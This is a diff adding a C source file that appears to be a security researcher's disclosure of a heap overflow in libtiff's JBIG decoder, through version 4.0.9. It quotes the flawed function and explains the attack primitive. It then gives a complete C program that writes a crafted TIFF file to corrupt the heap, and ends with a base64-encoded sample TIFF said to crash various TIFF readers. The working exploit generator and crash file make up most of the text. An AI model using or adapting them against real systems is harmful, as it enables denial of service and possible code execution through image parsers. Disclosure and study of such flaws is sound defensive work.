@@ -1,0 +1,301 @@
+/*
+libtiff up to and including 4.0.9 decodes arbitrarily-sized JBIG into a buffer, ignoring the buffer size.
+
+The issue occurs because JBIGDecode entirely ignores the size of the buffer that is passed to it:
+
+
+static int JBIGDecode(TIFF* tif, uint8* buffer, tmsize_t size, uint16 s)
+{
+	struct jbg_dec_state decoder;
+	int decodeStatus = 0;
+	unsigned char* pImage = NULL;
+	(void) size, (void) s;
+	if (isFillOrder(tif, tif->tif_dir.td_fillorder))
+	{
+		TIFFReverseBits(tif->tif_rawdata, tif->tif_rawdatasize);
+	}
+	jbg_dec_init(&decoder);
+(...)
+	decodeStatus = jbg_dec_in(&decoder, (unsigned char*)tif->tif_rawdata,
+				  (size_t)tif->tif_rawdatasize, NULL);
+	if (JBG_EOK != decodeStatus)
+	{
+		(...)
+	}
+	pImage = jbg_dec_getimage(&decoder, 0);
+	_TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));
+	jbg_dec_free(&decoder);
+	return 1;
+}
+
+
+The 4th line above is apparently to silence compiler warnings; the code proceeds to decode the JBIG contents, and then blindly copies as many bytes as decoded into the target buffer by means of _TIFFmemcpy.
+
+The attack primitive here ends up as follows:
+1) The attacker gets to perform an allocation of a size of his choosing.
+2) The attacker gets to write a pretty arbitrary amount of data of his choosing into this buffer.
+
+Reproducing testcases can be generated using the following C code:
+=============================================================================
+*/
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <stdint.h>
+#include "jbig.h"
+
+
+void output_bie(unsigned char *start, size_t len, void *file)
+{
+  fwrite(start, 1, len, (FILE *) file);
+
+  return;
+}
+
+int main(int argc, char**argv)
+{
+  FILE* inputfile = fopen(argv[1], "rb");
+  FILE* outputfile = fopen(argv[2], "wb");
+
+  // Write the hacky TIF header.
+  unsigned char buf[] = {
+    0x49, 0x49, // Identifier.
+    0x2A, 0x00, // Version.
+    0xCA, 0x03, 0x00, 0x00, // First IFD offset.
+    0x32, 0x30, 0x30, 0x31,
+    0x3a, 0x31, 0x31, 0x3a,
+    0x32, 0x37, 0x20, 0x32,
+    0x31, 0x3a, 0x34, 0x30,
+    0x3a, 0x32, 0x38, 0x00,
+    0x38, 0x00, 0x00, 0x00,
+    0x01, 0x00, 0x00, 0x00,
+    0x38, 0x00, 0x00, 0x00,
+    0x00, 0x01, 0x00, 0x00
+  };
+  fwrite(&(buf[0]), sizeof(buf), 1, outputfile);
+
+  // Read the inputfile.
+  struct stat st;
+  stat(argv[1], &st);
+  size_t size = st.st_size;
+  unsigned char* data = malloc(size);
+  fread(data, size, 1, inputfile);
+
+  // Calculate how many "pixels" we have in the input.
+  unsigned char *bitmaps[1] = { data };
+  struct jbg_enc_state se;
+
+  jbg_enc_init(&se, size * 8, 1, 1, bitmaps, output_bie, outputfile);
+  jbg_enc_out(&se);
+  jbg_enc_free(&se);
+
+  // The raw JBIG data has been written, now write the IFDs for the TIF file.
+  unsigned char ifds[] = {
+    0x0E, 0x00, // Number of entries.     +0
+
+    0xFE, 0x00, // Subfile type.          +2
+    0x04, 0x00, // Datatype: LONG.        +6
+    0x01, 0x00, 0x00, 0x00, // 1 element. +10
+    0x00, 0x00, 0x00, 0x00, // 0          +14
+    0x00, 0x01, // IMAGE_WIDTH            +16
+    0x03, 0x00, // Datatype: SHORT.       +18
+    0x01, 0x00, 0x00, 0x00, // 1 element. +22
+    0x96, 0x00, 0x00, 0x00, // 96 hex width.  +26
+    0x01, 0x01, // IMAGE_LENGTH           +28
+    0x03, 0x00, // SHORT                  +30
+    0x01, 0x00, 0x00, 0x00, // 1 element  +34
+    0x96, 0x00, 0x00, 0x00, // 96 hex length. +38
+    0x02, 0x01, // BITS_PER_SAMPLE        +40
+    0x03, 0x00, // SHORT                  +42
+    0x01, 0x00, 0x00, 0x00, // 1 element  +46
+    0x01, 0x00, 0x00, 0x00, // 1          +50
+    0x03, 0x01, // COMPRESSION            +52
+    0x03, 0x00, // SHORT                  +54
+    0x01, 0x00, 0x00, 0x00, // 1 element  +58
+    0x65, 0x87, 0x00, 0x00, // JBIG       +62
+    0x06, 0x01, // PHOTOMETRIC            +64
+    0x03, 0x00, // SHORT                  +66
+    0x01, 0x00, 0x00, 0x00, // 1 element  +70
+    0x00, 0x00, 0x00, 0x00,          // / +74
+    0x11, 0x01, // STRIP_OFFSETS          +78
+    0x04, 0x00, // LONG                   +80
+    0x13, 0x00, 0x00, 0x00, // 0x13 elements  +82
+    0x2C, 0x00, 0x00, 0x00, // Offset 2C in file  +86
+    0x15, 0x01, // SAMPLES_PER_PIXEL      +90
+    0x03, 0x00, // SHORT                  +92
+    0x01, 0x00, 0x00, 0x00, // 1 element  +94
+    0x01, 0x00, 0x00, 0x00, // 1          +98
+    0x16, 0x01, // ROWS_PER_STRIP         +102
+    0x04, 0x00, // LONG                   +104
+    0x01, 0x00, 0x00, 0x00, // 1 element  +106
+    0xFF, 0xFF, 0xFF, 0xFF, // Invalid    +110
+    0x17, 0x01, // STRIP_BYTE_COUNTS      +114
+    0x04, 0x00, // LONG                   +116
+    0x13, 0x00, 0x00, 0x00, // 0x13 elements  +118
+    0xC5, 0xC0, 0x00, 0x00, // Read 0xC0C5 bytes for the strip? +122
+    0x1A, 0x01, // X_RESOLUTION
+    0x05, 0x00, // RATIONAL
+    0x01, 0x00, 0x00, 0x00, // 1 element
+    0x1C, 0x00, 0x00, 0x00,
+    0x1B, 0x01, // Y_RESOLUTION
+    0x05, 0x00, // RATIONAL
+    0x01, 0x00, 0x00, 0x00, // 1 Element
+    0x24, 0x00, 0x00, 0x00,
+    0x28, 0x01, // RESOLUTION_UNIT
+    0x03, 0x00, // SHORT
+    0x01, 0x00, 0x00, 0x00, // 1 Element
+    0x02, 0x00, 0x00, 0x00, // 2
+    0x0A, 0x01, // FILL_ORDER
+    0x03, 0x00, // SHORT
+    0x01, 0x00, 0x00, 0x00, // 1 Element
+    0x02, 0x00, 0x00, 0x00, // Bit order inverted.
+    0x00, 0x00, 0x00, 0x00 };
+
+  // Adjust the offset for the IFDs.
+  uint32_t ifd_offset = ftell(outputfile);
+  fwrite(&(ifds[0]), sizeof(ifds), 1, outputfile);
+  fseek(outputfile, 4, SEEK_SET);
+  fwrite(&ifd_offset, sizeof(ifd_offset), 1, outputfile);
+
+  // Adjust the strip size properly.
+  fseek(outputfile, ifd_offset + 118, SEEK_SET);
+  fwrite(&ifd_offset, sizeof(ifd_offset), 1, outputfile);
+
+  fclose(outputfile);
+  fclose(inputfile);
+  return 0;
+}
+
+/*
+===============================================================
+Build & link with -ljbig.
+
+You can then create a new TIFF file that corrupts the heap by doing
+./a.out file_with_data_to_clobber_the_heap_with.txt outputfile.tiff
+
+An example TIFF file that crashes various tiff readers is base64-encoded
+below:
+
+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
+AAAAAAAA
+ 
+Labels:
+Vendor-libtiff
+Product-libtiff
+Severity-High
+Methodology-source-review (e.g. Methodology-source-review)
+Finder-thomasdullien
+Reported-2018-Oct-13
+*/
